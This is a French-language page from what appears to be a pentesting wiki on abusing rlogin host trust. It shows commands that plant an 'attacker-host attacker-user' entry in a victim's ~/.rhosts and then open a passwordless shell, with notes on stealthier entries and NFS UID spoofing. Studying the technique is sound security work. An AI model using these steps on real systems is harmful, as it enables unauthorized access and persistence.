---
order: 4
title: "Contournement rhosts : rlogin sans mot de passe via la confiance d'hôte"
description: "rlogin accepte une connexion sans mot de passe lorsque le .rhosts de l'utilisateur cible ou le hosts.equiv système fait confiance à l'hôte et à l'utilisateur qui se connectent. Abuser d'une confiance existante, ou planter une entrée .rhosts là où le répertoire home est accessible en écriture, accorde un shell interactif en tant que cible sans mot de passe, la même faiblesse de confiance d'hôte que rsh appliquée à la connexion interactive."
keywords:
  - rhosts
  - rlogin
  - passwordless
  - trusted host
  - interactive shell
---

# Contournement rhosts

`rlogin` honore la même confiance basée sur l'hôte que rsh : si le `~/.rhosts` de l'utilisateur cible ou le `/etc/hosts.equiv` système fait confiance à l'hôte et au nom d'utilisateur qui se connectent, la connexion réussit sans mot de passe, débouchant directement sur un shell interactif. L'attaque est identique en mécanisme au cas rsh, mais livre une session de connexion plutôt qu'une seule commande. Un attaquant utilise une confiance existante (en se connectant depuis, ou en usurpant, un hôte de confiance), ou plante une entrée `.rhosts` là où il peut écrire dans le home de la cible, puis `rlogin -l <user>` pour un shell interactif sans mot de passe.

```bash
# passwordless interactive login when trusted
rlogin -l <user> <target>
# plant trust first if you can write the target's home (e.g. over NFS)
echo 'attacker-host attacker-user' >> ~victim/.rhosts
rlogin -l victim <target>          # now no password
```

## Notes d'exploitation

- Le gain par rapport à rsh est un shell interactif (rlogin) plutôt qu'une seule commande, donc c'est préférable quand on veut une session ; le mécanisme de confiance et les moyens de l'obtenir sont les mêmes.
- Planter `.rhosts` nécessite une écriture dans le répertoire home (usurpation d'UID NFS, partage accessible en écriture, point d'ancrage) ; `+ +` ouvre le compte à tout hôte/utilisateur, une entrée ciblée est plus furtive, voir [écriture rhosts](../trust-abuse/rhosts-write.md).
- La confiance s'applique par utilisateur, donc visez le `.rhosts` d'un compte spécifique ; pour une portée large, un [hosts.equiv](../trust-abuse/hosts-equiv-trust.md) permissif couvre tous les utilisateurs non root.
- Là où la confiance n'est pas disponible, rlogin se rabat sur un mot de passe que vous pouvez [capturer en clair](cleartext-passwords.md).

## Références

- [man 5 rhosts](https://man7.org/linux/man-pages/man5/rhosts.5.html)
- [HackTricks: rlogin](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rlogin)
